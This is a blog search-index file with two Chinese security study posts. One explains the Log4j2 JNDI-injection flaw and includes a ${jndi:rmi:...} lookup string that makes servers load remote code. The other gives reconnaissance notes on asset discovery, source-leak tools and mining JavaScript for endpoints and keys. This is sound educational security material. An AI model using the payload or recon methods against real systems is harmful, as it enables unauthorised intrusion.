<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CVE复现</title>
    <link href="/2024/10/16/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    <url>/2024/10/16/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2021-44228复现"><a href="#CVE-2021-44228复现" class="headerlink" title="CVE-2021-44228复现"></a>CVE-2021-44228复现</h1><h2 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h2><p>Apache log4j 2是一个Java的日志记录工具通过重写了log4j框架，并且引入了大量丰富的特性，可以控制日志信息输送的目的地 为控制台、文件、GUI组件等，被应用于业务系统开发，用于记录程序输入输出日志信息。</p><h2 id="大致原理："><a href="#大致原理：" class="headerlink" title="大致原理："></a>大致原理：</h2><p>log4j2中存在<strong>JNDI注入漏洞</strong>，log4j2会将用户输入的内容记录到日志当中，如果输入特殊字符串  会被log4j2解析然后调用JNDI接口中的lookup方法 从而会远程下载恶意代码并执行</p><h2 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h2><p>JNDI（Java Naming and Directory Interface）是Java提供的一个标准接口，用于让应用程序能够方便地访问不同的命名和目录服务，比如LDAP、DNS等。它帮助Java应用程序通过统一的方式和不同的命名服务进行交互。**[LDAP是一种限制去访问其他目录以及外部资源的一种协议]**</p><h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a><strong>JNDI注入</strong></h2><p>是一种攻击方式，利用了JNDI接口的特点，让攻击者能够通过它执行远程代码。通俗地说，就是攻击者可以欺骗程序，让它从攻击者控制的服务器上下载并执行恶意代码。</p><p>因为JNDI默认是建立在信任的基础上这意味着，一旦程序通过JNDI获取了一个对象或类，它会自动执行这个对象或类的代码</p><p><strong>举个例子</strong>：</p><ol><li>正常情况下，程序会通过JNDI从一个合法的服务器上下载所需的代码或数据。</li><li>但是，如果存在安全漏洞，攻击者可以通过操纵JNDI的请求，告诉程序去连接到攻击者控制的恶意服务器。</li><li>当程序连接到这个恶意服务器时，它会下载并执行攻击者的恶意代码，从而让攻击者在受害者的系统上运行任意代码，甚至完全控制系统。</li></ol><p>在 JNDI 注入攻击中，常用的攻击方式包括通过 <strong>RMI（远程方法调用）</strong> 和 <strong>LDAP（轻量级目录访问协议）</strong> 这两种服务。它们允许程序通过网络访问远程的资源，但在漏洞中，被攻击者利用来提供恶意代码。</p><p>在这个漏洞中就是利用了LDAP</p><h2 id="漏洞详细原理"><a href="#漏洞详细原理" class="headerlink" title="漏洞详细原理"></a>漏洞详细原理</h2><p>Log4j 之所以会解析类似于 <code>$&#123;jndi:rmi:192.168.23.134:1099/exp&#125;</code> 这样的字符串，主要是因为它提供了<strong>动态变量替换</strong>的功能。这种功能使得 Log4j 不仅仅是一个简单的日志记录工具，它能够根据日志消息的内容动态地解析和处理特定格式的字符串。</p><h3 id="1-动态变量替换"><a href="#1-动态变量替换" class="headerlink" title="1. 动态变量替换"></a>1. 动态变量替换</h3><ul><li>Log4j 支持在日志消息中使用变量和格式化信息。通过 <code>$&#123;&#125;</code> 语法，Log4j 可以将特定的内容替换为实际值。例如，你可以在日志中引用系统属性、环境变量或其他上下文信息。</li></ul><h3 id="2-JNDI-查找支持"><a href="#2-JNDI-查找支持" class="headerlink" title="2. JNDI 查找支持"></a>2. JNDI 查找支持</h3><ul><li>Log4j2 引入了对 JNDI 的支持，使得应用程序可以在日志中引用 JNDI 查找。这样，当日志消息中包含 <code>$&#123;jndi:...&#125;</code> 的时候，Log4j 会尝试执行 JNDI 查找，以获取相关对象。这使得开发者能够灵活地使用外部资源，但也因此引入了安全风险。</li></ul><h3 id="3-解析和执行"><a href="#3-解析和执行" class="headerlink" title="3. 解析和执行"></a>3. 解析和执行</h3><ul><li>当 Log4j 处理日志消息时，它会检查消息内容。如果发现 <code>$&#123;jndi:...&#125;</code> 这样的结构，它会调用 JNDI API 来执行查找。这个过程是动态的，Log4j 会连接到指定的 JNDI 服务（如 LDAP）而<code>$&#123;jndi:rmi:...&#125;</code>就是调用JNDI API来执行查找并且指定里了LDAP服务，然后就会获取返回的对象。</li><li>如果返回的对象是一个 Java 类，Log4j 就会加载并执行它，这就是导致远程代码执行（RCE）漏洞的原因</li></ul><h2 id="拓展-Log4j"><a href="#拓展-Log4j" class="headerlink" title="拓展 Log4j"></a>拓展 Log4j</h2><p>Log4j 作为一个日志记录工具，提供解析和执行功能的原因主要是为了增强灵活性和扩展性，使得开发者能够根据实际需求动态生成和处理日志信息。下面是一些原因和具体的例子，说明为什么一个日志工具可能需要这些功能。</p><h3 id="1-动态生成日志信息"><a href="#1-动态生成日志信息" class="headerlink" title="1. 动态生成日志信息"></a>1. 动态生成日志信息</h3><h4 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h4><ul><li>允许开发者在日志中插入动态值，比如用户信息、环境变量、系统状态等，从而使日志更具上下文和可读性。</li></ul><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>假设一个 web 应用程序需要记录用户的登录活动，开发者可以在日志消息中使用动态变量：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">logger.info(<span class="hljs-string">&quot;User &#123;&#125; logged in from IP: &#123;&#125;&quot;</span>, username, ipAddress);<br></code></pre></td></tr></table></figure><p>在这条日志记录中，<code>&#123;&#125;</code> 会被替换为 <code>username</code> 和 <code>ipAddress</code> 的实际值。这样，记录的日志将包含用户的具体信息，方便后续审计和分析。</p><h3 id="2-使用外部资源"><a href="#2-使用外部资源" class="headerlink" title="2. 使用外部资源"></a>2. 使用外部资源</h3><h4 id="目的-1"><a href="#目的-1" class="headerlink" title="目的"></a>目的</h4><ul><li>允许从外部服务或资源获取数据，这样可以在日志中包含实时信息或相关对象。例如，获取配置值、统计信息或状态报告。</li></ul><h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><p>如果一个应用程序希望在日志中记录当前数据库连接的状态，可以通过 JNDI 查找获取相应的状态信息：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">logger.info(<span class="hljs-string">&quot;Current database connection: &#123;&#125;&quot;</span>, context.lookup(<span class="hljs-string">&quot;java:comp/env/jdbc/MyDataSource&quot;</span>));<br></code></pre></td></tr></table></figure><p>在这个例子中，<code>lookup</code> 方法会查询命名服务并获取数据库连接对象的状态信息。这样，日志不仅可以记录信息，还可以提供上下文。</p><h3 id="3-灵活的日志记录"><a href="#3-灵活的日志记录" class="headerlink" title="3. 灵活的日志记录"></a>3. 灵活的日志记录</h3><h4 id="目的-2"><a href="#目的-2" class="headerlink" title="目的"></a>目的</h4><ul><li>根据不同的上下文和配置动态调整日志内容。例如，开发者可能希望在某些条件下记录额外的信息。</li></ul><h4 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h4><p>在处理异常时，开发者可能希望在日志中记录更多的信息，如当前用户的上下文：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-comment">// 可能抛出异常的代码</span><br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>    logger.error(<span class="hljs-string">&quot;An error occurred for user &#123;&#125;: &#123;&#125;&quot;</span>, currentUser, e.getMessage());<br>&#125;<br></code></pre></td></tr></table></figure><p>这里，<code>currentUser</code> 是动态获取的用户信息，这样的日志记录可以帮助开发者快速定位问题。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>因此，Log4j 提供的解析和执行功能是为了增强日志记录的灵活性和实用性。虽然这些功能为开发者提供了更强大的工具，但也带来了安全风险。例如，如果日志输入未经过滤，攻击者可以利用这些动态功能执行恶意代码。为了安全，开发者在使用这些功能时需要谨慎，并确保输入被正确验证和清理。</p>]]></content>
    
    
    
    <tags>
      
      <tag>CVE复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息打点</title>
    <link href="/2024/10/02/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9/"/>
    <url>/2024/10/02/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<h1 id="信息打点"><a href="#信息打点" class="headerlink" title="信息打点"></a>信息打点</h1><h2 id="信息搜集的相关线上工具"><a href="#信息搜集的相关线上工具" class="headerlink" title="信息搜集的相关线上工具"></a>信息搜集的相关线上工具</h2><table><thead><tr><th>标签</th><th>名称</th><th>地址</th></tr></thead><tbody><tr><td>企业信息</td><td>天眼查</td><td><a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></td></tr><tr><td>企业信息</td><td>小蓝本</td><td><a href="https://www.xiaolanben.com/">https://www.xiaolanben.com/</a></td></tr><tr><td>企业信息</td><td>爱企查</td><td><a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com/</a></td></tr><tr><td>企业信息</td><td>企查查</td><td><a href="https://www.qcc.com/">https://www.qcc.com/</a></td></tr><tr><td>企业信息</td><td>国外企查</td><td><a href="https://opencorporates.com/">https://opencorporates.com/</a></td></tr><tr><td>企业信息</td><td>启信宝</td><td><a href="https://www.qixin.com/">https://www.qixin.com/</a></td></tr><tr><td>备案信息</td><td>备案信息查询</td><td><a href="http://www.beianx.cn/">http://www.beianx.cn/</a></td></tr><tr><td>备案信息</td><td>备案管理系统</td><td><a href="https://beian.miit.gov.cn/">https://beian.miit.gov.cn/</a></td></tr><tr><td>公众号信息</td><td>搜狗微信搜索</td><td><a href="https://weixin.sogou.com/">https://weixin.sogou.com/</a></td></tr><tr><td>注册域名</td><td>域名注册查询</td><td><a href="https://buy.cloud.tencent.com/domain">https://buy.cloud.tencent.com/domain</a></td></tr><tr><td>IP 反查</td><td>IP 反查域名</td><td><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></td></tr><tr><td>IP 反查</td><td>IP 反查域名</td><td><a href="http://dns.bugscaner.com/">http://dns.bugscaner.com/</a></td></tr><tr><td>DNS 数据</td><td>dnsdumpster</td><td><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></td></tr><tr><td>证书查询</td><td>CertificateSearch</td><td><a href="https://crt.sh/">https://crt.sh/</a></td></tr><tr><td>网络空间</td><td>FOFA</td><td><a href="https://fofa.info/">https://fofa.info/</a></td></tr><tr><td>网络空间</td><td>全球鹰</td><td><a href="http://hunter.qianxin.com/">http://hunter.qianxin.com/</a></td></tr><tr><td>网络空间</td><td>360</td><td><a href="https://quake.360.cn/quake/%23/index">https://quake.360.cn/quake/</a></td></tr><tr><td>威胁情报</td><td>微步在线 情报社区</td><td><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></td></tr><tr><td>威胁情报</td><td>奇安信 威胁情报中心</td><td><a href="https://ti.qianxin.com/">https://ti.qianxin.com/</a></td></tr><tr><td>威胁情报</td><td>360 威胁情报中心</td><td><a href="https://ti.360.cn/%23/homepage">https://ti.360.cn/#/homepage</a></td></tr><tr><td>枚举解析</td><td>在线子域名查询</td><td><a href="http://tools.bugscaner.com/subdomain/">http://tools.bugscaner.com/subdomain/</a></td></tr><tr><td>枚举解析</td><td>DNSGrep 子域名查询</td><td><a href="https://www.dnsgrep.cn/subdomain">https://www.dnsgrep.cn/subdomain</a></td></tr><tr><td>枚举解析</td><td>工具强大的子域名收集器</td><td><a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></td></tr><tr><td>指纹识别</td><td>在线 cms 指纹识别</td><td><a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></td></tr><tr><td>指纹识别</td><td>Wappalyzer</td><td><a href="https://github.com/AliasIO/wappalyzer">https://github.com/AliasIO/wappalyzer</a></td></tr><tr><td>指纹识别</td><td>TideFinger 潮汐</td><td><a href="http://finger.tidesec.net/">http://finger.tidesec.net/</a></td></tr><tr><td>指纹识别</td><td>云悉指纹</td><td><a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></td></tr><tr><td>指纹识别</td><td>WhatWeb</td><td><a href="https://github.com/urbanadventurer/WhatWeb">https://github.com/urbanadventurer/WhatWeb</a></td></tr><tr><td>指纹识别</td><td>数字观星 Finger-P</td><td><a href="https://fp.shuziguanxing.com/%23/">https://fp.shuziguanxing.com/#/</a></td></tr><tr><td>网络空间</td><td>钟馗之眼</td><td><a href="https://www.zoomeye.org/?R1nG">https://www.zoomeye.org/</a></td></tr><tr><td>网络空间</td><td>零零信安</td><td><a href="https://0.zone/">https://0.zone/</a></td></tr><tr><td>网络空间</td><td>Shodan</td><td><a href="https://www.shodan.io/">https://www.shodan.io/</a></td></tr><tr><td>网络空间</td><td>Censys</td><td><a href="https://censys.io/">https://censys.io/</a></td></tr><tr><td>网络空间</td><td>ONYPHE</td><td><a href="https://www.onyphe.io/">https://www.onyphe.io/</a></td></tr><tr><td>网络空间</td><td>FullHunt</td><td><a href="https://fullhunt.io/">https://fullhunt.io/</a></td></tr><tr><td>网络空间</td><td>Soall Search Engine</td><td><a href="https://soall.org/">https://soall.org/</a></td></tr><tr><td>网络空间</td><td>Netlas</td><td><a href="https://app.netlas.io/responses/">https://app.netlas.io/responses/</a></td></tr><tr><td>网络空间</td><td>Leakix</td><td><a href="https://leakix.net/">https://leakix.net/</a></td></tr><tr><td>网络空间</td><td>DorkSearch</td><td><a href="https://dorksearch.com/">https://dorksearch.com/</a></td></tr><tr><td>威胁情报</td><td>VirusTotal 在线查杀平台</td><td><a href="https://www.virustotal.com/gui/">https://www.virustotal.com/gui/</a></td></tr><tr><td>威胁情报</td><td>VenusEye 威胁情报中心</td><td><a href="https://www.venuseye.com.cn/">https://www.venuseye.com.cn/</a></td></tr><tr><td>威胁情报</td><td>绿盟科技 威胁情报云</td><td><a href="https://ti.nsfocus.com/">https://ti.nsfocus.com/</a></td></tr><tr><td>威胁情报</td><td>IBM 情报中心</td><td><a href="https://exchange.xforce.ibmcloud.com/">https://exchange.xforce.ibmcloud.com/</a></td></tr><tr><td>威胁情报</td><td>天际友盟安全智能平台</td><td><a href="https://redqueen.tj-un.com/IntelHome.html">https://redqueen.tj-un.com</a></td></tr><tr><td>威胁情报</td><td>华为安全中心平台</td><td><a href="https://isecurity.huawei.com/sec/web/intelligencePortal.do">https://isecurity.huawei.com/sec</a></td></tr><tr><td>威胁情报</td><td>安恒威胁情报中心</td><td><a href="https://ti.dbappsecurity.com.cn/">https://ti.dbappsecurity.com.cn/</a></td></tr><tr><td>威胁情报</td><td>AlienVault</td><td><a href="https://otx.alienvault.com/">https://otx.alienvault.com/</a></td></tr><tr><td>威胁情报</td><td>深信服</td><td><a href="https://sec.sangfor.com.cn/analysis-platform">https://sec.sangfor.com.cn/</a></td></tr><tr><td>威胁情报</td><td>丁爸情报分析师的工具箱</td><td><a href="http://dingba.top/">http://dingba.top/</a></td></tr><tr><td>威胁情报</td><td>听风者情报源 start.me</td><td><a href="https://start.me/p/X20Apn">https://start.me/p/X20Apn</a></td></tr><tr><td>威胁情报</td><td>GreyNoise Visualizer</td><td><a href="https://viz.greynoise.io/">https://viz.greynoise.io/</a></td></tr><tr><td>威胁情报</td><td>URLhaus 数据库</td><td><a href="https://urlhaus.abuse.ch/browse/">https://urlhaus.abuse.ch/browse/</a></td></tr><tr><td>威胁情报</td><td>Pithus</td><td><a href="https://beta.pithus.org/">https://beta.pithus.org/</a></td></tr></tbody></table><h2 id="业务资产："><a href="#业务资产：" class="headerlink" title="业务资产："></a>业务资产：</h2><p>1、WEB 应用</p><p>2、APP 应用</p><p>3、PC 端应用</p><p>4、小程序应用</p><p>5、微信公众号</p><p>6、其他产品等</p><h2 id="WEB-单域名："><a href="#WEB-单域名：" class="headerlink" title="WEB 单域名："></a>WEB 单域名：</h2><p>可以通过以下方式进行查询</p><p>1、备案信息</p><p>2、企业产权</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408221958707.png" alt="image-20240822195834444"></p><p>3、注册域名</p><p>4、反查解析</p><h2 id="WEB-子域名："><a href="#WEB-子域名：" class="headerlink" title="WEB 子域名："></a>WEB 子域名：</h2><p>1、DNS 数据</p><p>2、证书查询</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408231115983.png" alt="image-20240823111539836"></p><p>3、网络空间</p><p>4、威胁情报</p><p>5、枚举解析</p><h2 id="Web-架构资产：-指纹识别"><a href="#Web-架构资产：-指纹识别" class="headerlink" title="Web 架构资产：(指纹识别)"></a>Web 架构资产：(指纹识别)</h2><p>1、程序语言</p><p>2、框架源码</p><p>3、搭建平台</p><p>4、数据库类</p><p>5、操作系统</p><h3 id="纯内网网站识别cms"><a href="#纯内网网站识别cms" class="headerlink" title="纯内网网站识别cms"></a>纯内网网站识别cms</h3><p>可以使用该工具 [cmseek] </p><p>我觉得如果可以的话也能通过挂内网的代理来查</p><h2 id="源码泄露-开源闭源"><a href="#源码泄露-开源闭源" class="headerlink" title="源码泄露&amp;开源闭源"></a>源码泄露&amp;开源闭源</h2><h3 id="方法："><a href="#方法：" class="headerlink" title="方法："></a>方法：</h3><h3 id="后端-开源-指纹识别-源码下载"><a href="#后端-开源-指纹识别-源码下载" class="headerlink" title="后端-开源-指纹识别-源码下载"></a>后端-开源-指纹识别-源码下载</h3><p> [在网上可以直接搜到相关的cms程序源码]</p><h3 id="后端-闭源-配置不当-源码泄漏"><a href="#后端-闭源-配置不当-源码泄漏" class="headerlink" title="后端-闭源-配置不当-源码泄漏"></a>后端-闭源-配置不当-源码泄漏</h3><p>参考文章：<a href="https://www.secpulse.com/archives/124398.html">https://www.secpulse.com/archives/124398.html</a></p><p>备份：敏感目录文件扫描</p><p>CVS：<a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a></p><p>GIT：<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p><p>SVN：<a href="https://github.com/callmefeifei/SvnHack">https://github.com/callmefeifei/SvnHack</a></p><p>DS_Store：<a href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a></p><p>源码泄漏原因：</p><p>1、从源码本身的特性入口</p><p>2、从管理员不好的习惯入口</p><p>3、从管理员不好的配置入口</p><p>4、从管理员不好的意识入口</p><p>5、从管理员资源信息搜集入口</p><p>源码泄漏集合：</p><p>composer.json[便于开发]</p><p>git 源码泄露</p><p>svn 源码泄露</p><p>hg 源码泄漏</p><p>网站备份压缩文件 [通过扫网站的目录有可能扫到网站的压缩文件然后访问下载]</p><p>WEB-INF&#x2F;web.xml 泄露</p><p>DS_Store 文件泄露</p><p>SWP 文件泄露</p><p>CVS 泄露</p><p>Bzr 泄露</p><p>GitHub 源码泄漏</p><h3 id="后端-方向-资源-GITHUB-源码泄漏"><a href="#后端-方向-资源-GITHUB-源码泄漏" class="headerlink" title="后端-方向-资源 GITHUB-源码泄漏"></a>后端-方向-资源 GITHUB-源码泄漏</h3><p>问题 1：识别出大致信息却无下载资源</p><p>问题 2：未识别出信息使用码云资源获取</p><p>[可以直接通过f12看有哪些js文件 如果特征文件（指的是有些文件名可以看出是一些cms框架自带的默认的）可以去github上搜搜看]</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408241759806.png" alt="image-20240824175853583"></p><p>问题 3：其他行业开发使用对口资源站获取</p><p>涉及：</p><p><a href="https://gitee.com/">https://gitee.com/</a></p><p><a href="https://github.com/">https://github.com/</a></p><p><a href="https://www.huzhan.com/">https://www.huzhan.com/</a></p><h2 id="JS架构-框架识别-泄漏提取-API接口枚举-FUZZ爬虫-插件项目"><a href="#JS架构-框架识别-泄漏提取-API接口枚举-FUZZ爬虫-插件项目" class="headerlink" title="JS架构&amp;框架识别&amp;泄漏提取&amp;API接口枚举&amp;FUZZ爬虫&amp;插件项目"></a>JS架构&amp;框架识别&amp;泄漏提取&amp;API接口枚举&amp;FUZZ爬虫&amp;插件项目</h2><p>1、JS 前端架构-识别&amp;分析</p><p>2、JS 前端架构-开发框架分析</p><p>3、JS 前端架构-打包器分析</p><p>4、JS 前端架构-提取&amp;FUZZ</p><p>解决：</p><p>1、如何从表现中的 JS 提取价值信息</p><p>2、如何从地址中 FUZZ 提取未知的 JS 文件</p><p>3、如何从 JS 开放框架 WebPack 进行测试</p><h3 id="JS渗透测试"><a href="#JS渗透测试" class="headerlink" title="JS渗透测试"></a>JS渗透测试</h3><p>什么是 JS 渗透测试？</p><p> 在 Javascript 中也存在变量和函数，当存在可控变量及函数调用即可参数漏洞JS 开发的 WEB 应用和 PHP，JAVA,NET 等区别在于即没有源代码，也可以通过浏览器的查看源代码获取真实的点。获取 URL，获取 JS 敏感信息，获取代码传参等，所以相当于JS 开发的 WEB 应用属于白盒测试（默认有源码参考），<strong>一般会在 JS 中寻找更多的 URL地址，</strong>在 JS 代码逻辑（加密算法，APIkey 配置，验证逻辑等）进行后期安全测试。</p><p> -后端语言：java php python  .NET框架  在浏览器端看不到真实的源代码；</p><p>-前端语言：JavaScript（JS）和JS框架在浏览器端可以看到真实的源代码</p><p>例子：</p><p>zblog：核心功能采用 PHP 语言去传输接受</p><p>vue.js：核心功能采用框架语法（JS）传输接受</p><h3 id="1、JS-安全问题"><a href="#1、JS-安全问题" class="headerlink" title="1、JS 安全问题"></a>1、JS 安全问题</h3><p> <strong>源码泄漏</strong></p><p> <strong>未授权访问&#x3D;JS 里面分析更多的 URL 访问确定接口路径</strong></p><p> <strong>敏感 key 泄漏&#x3D;JS 文件中可能配置了接口信息（云应用，短信，邮件，数据库等）</strong></p><p> <strong>API 接口安全&#x3D;（代码中加密提交参数传递，更多的 URL 路径）</strong></p><h3 id="2、流行的-Js-框架有那些？"><a href="#2、流行的-Js-框架有那些？" class="headerlink" title="2、流行的 Js 框架有那些？"></a>2、流行的 Js 框架有那些？</h3><p> Vue   NodeJS   jQuery   Angular 等</p><h3 id="3、如何判定-JS-开发应用？"><a href="#3、如何判定-JS-开发应用？" class="headerlink" title="3、如何判定 JS 开发应用？"></a>3、如何判定 JS 开发应用？</h3><p> 插件 wappalyzer</p><p>如图：这并不是JS 开发应用</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408251213026.png" alt="image-20240825121343865"></p><p>这个便是JS 开发应用</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408251222370.png" alt="image-20240825122251186"> </p><p>源程序代码简短</p><p> 引入多个 js 文件</p><p> 一般有&#x2F;static&#x2F;js&#x2F;app.js 等顺序的 js 文件</p><p> 一般 cookie 中有 connect.sid</p><h4 id="（1）查看页面源码"><a href="#（1）查看页面源码" class="headerlink" title="（1）查看页面源码"></a>（1）<strong>查看页面源码</strong></h4><ul><li>右键点击网页，然后选择“查看页面源码”（或类似选项）。在源码中，搜索 <code>&lt;script&gt;</code> 标签。如果你看到大量的 JavaScript 代码或外部 JavaScript 文件链接（通常以 <code>.js</code> 结尾），这表明页面使用了 JavaScript。</li></ul><h4 id="（2）使用浏览器开发者工具"><a href="#（2）使用浏览器开发者工具" class="headerlink" title="（2）使用浏览器开发者工具"></a>（2）<strong>使用浏览器开发者工具</strong></h4><ul><li>按 <code>F12</code> 或右键选择“检查”（或类似选项）打开浏览器的开发者工具。</li><li>在“网络”选项卡中，刷新页面并查看加载的资源。如果你看到很多 <code>.js</code> 文件被加载，说明该网页使用了 JavaScript。</li><li>在“控制台”选项卡中，观察是否有 JavaScript 代码输出的日志、错误或警告信息，这也是页面使用 JavaScript 的迹象。</li></ul><h4 id="（3）查看交互功能"><a href="#（3）查看交互功能" class="headerlink" title="（3）查看交互功能"></a>（3）<strong>查看交互功能</strong></h4><ul><li>观察页面的动态交互功能，比如表单验证、按钮点击后的效果、动态内容加载等。如果这些功能在不刷新页面的情况下发生变化，通常是通过 JavaScript 实现的。</li></ul><h4 id="（4）禁用-JavaScript"><a href="#（4）禁用-JavaScript" class="headerlink" title="（4）禁用 JavaScript"></a>（4）<strong>禁用 JavaScript</strong></h4><ul><li>你可以在浏览器中禁用 JavaScript，然后重新加载页面。大多数浏览器允许你在设置中禁用 JavaScript。如果页面的大部分功能停止工作，或页面显示异常，那么这个页面很可能依赖于 JavaScript。</li></ul><h4 id="（5）识别单页应用（SPA）"><a href="#（5）识别单页应用（SPA）" class="headerlink" title="（5）识别单页应用（SPA）"></a>（5）<strong>识别单页应用（SPA）</strong></h4><ul><li>单页应用（SPA）通常完全依赖 JavaScript。</li><li>点击页面中所包含的其他链接后你可以观察URL的变化（比如URL中包含 <code>#</code> 或路径变化而页面不刷新），这些都表明可能是一个由JavaScript驱动的单页应用。</li></ul><h3 id="4、如何获取更多的-JS-文件？"><a href="#4、如何获取更多的-JS-文件？" class="headerlink" title="4、如何获取更多的 JS 文件？"></a>4、如何获取更多的 JS 文件？</h3><p> 手工-浏览器搜索</p><p> 半自动-Burpsuite 插件</p><p> 工具化-各类提取&amp;FUZZ 项目</p><h3 id="5、如何快速获取价值信息？"><a href="#5、如何快速获取价值信息？" class="headerlink" title="5、如何快速获取价值信息？"></a>5、如何快速获取价值信息？</h3><h4 id="（1）手工搜索分析"><a href="#（1）手工搜索分析" class="headerlink" title="（1）手工搜索分析"></a>（1）手工搜索分析</h4><p>在控制台的网络里边的js文件中shift+ctrl+f依次搜索以下内容</p><p>注意：在搜索到的结果中只需要着重的去看路径即可（因为有的文件路径很长基本不可能爆破出来）</p><p> src&#x3D;</p><p> path&#x3D;   </p><p> method:”get”</p><p> http.get(“</p><p> method:”post”</p><p>$.ajax </p><p><a href="http://service.httppost/">http://service.httppost</a></p><p><a href="http://service.httpget/">http://service.httpget</a></p><h4 id="（2）-半自动-Burpsuite-插件"><a href="#（2）-半自动-Burpsuite-插件" class="headerlink" title="（2） 半自动-Burpsuite 插件"></a>（2） 半自动-Burpsuite 插件</h4><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408261741520.png" alt="image-20240826174058378"></p><p>可以去安装这些插件后两个可以去网上搜 在github上都可以搜到</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408261742827.png" alt="image-20240826174231776"></p><p>针对HaE这个插件因为正则匹配默认只有一个规则所以需要引进 直接把<a href="https://raw.githubusercontent.com/gh0stkey/HaE/gh-pages/Rules.yml">其中</a>的内容粘贴到上面图片中的路径文件中即可</p><p>注意：在更改yml文件的时候把burp关闭</p><p>出现下图所示的时候表示配置成功</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408261742200.png" alt="image-20240826174237153"></p><p>在Proxy-&gt;HTTP history中即可看到被上色的流量包</p><p>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408261748546.png" alt="屏幕截图 2024-08-26 162129"></p><h4 id="（3）全自动-插件，脚本"><a href="#（3）全自动-插件，脚本" class="headerlink" title="（3）全自动-插件，脚本"></a>（3）全自动-插件，脚本</h4><p>以下项目均可以从github上搜索下载</p><p>1</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408261806011.png" alt="image-20240826180622964"></p><p>这个是一个浏览器插件可以发现一些文件路径以及会筛选出一些敏感字符，例如：password、username等</p><p>2</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408261808754.png" alt="image-20240826180832720"></p><p>这是一个可以从js文件中获取url的脚本 结果会输出一个html文件可以查看</p><p><strong>注意：有时候会误报</strong></p><p>3</p><p><strong>urlfind脚本[推荐]</strong></p><p>项目地址：<a href="https://github.com/pingc0y/URLFinder/releases/tag/2023.9.9">https://github.com/pingc0y/URLFinder/releases/tag/2023.9.9</a></p><p>可以显示出js文件 以及js文件中的敏感信息还有一些url‘</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408261859767.png" alt="image-20240826185926715"></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408261859960.png" alt="image-20240826185910884"></p><p>4</p><p><strong>ffuf js文件名爆破 [推荐]</strong></p><p>例如：</p><p><a href="https://github.githubassets.com/assets/vendors-node_modules_dompurify_dist_purify_js-89a69c248502.js">https://github.githubassets.com/assets/vendors-node_modules_dompurify_dist_purify_js-89a69c248502.js</a></p><p>因为有些js文件的url在一个页面中的js文件中可能找不到但是我们可以通过爆破的办法来实现</p><p>项目地址：</p><p><a href="https://github.com/ffuf/ffuf?tab=readme-ov-file">https://github.com/ffuf/ffuf?tab=readme-ov-file</a></p><p>含有很多字典的一个网站：[强烈推荐]</p><p><a href="https://wordlists.assetnote.io/">https://wordlists.assetnote.io/</a></p><p>然后我们可以利用jsfinderPlus来获取我们所爆破出来的url中的js文件所包含的url 从而获取更多的信息</p><p>5</p><p>Packer Fuzzer：<a href="https://github.com/rtcatc/Packer-Fuzzer">https://github.com/rtcatc/Packer-Fuzzer</a></p><p>本工具支持自动模糊提取对应使用Webpack打包器的站点的API以及API对应的参数内容，并支持对：未授权访问、敏感信息泄露、CORS、SQL注入、水平越权、弱口令、任意文件上传七大漏洞进行模糊高效的快速检测。在扫描结束之后，本工具还支持自动生成扫描报告</p><p>注意识别误报</p><p>可以在fofa或者鹰图等资产搜索平台上搜索使用了Webpack打包器的站点访问目标网站时可以看看wappalyzer插件中的杂项中是否有Webpack</p><p>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408262130948.png" 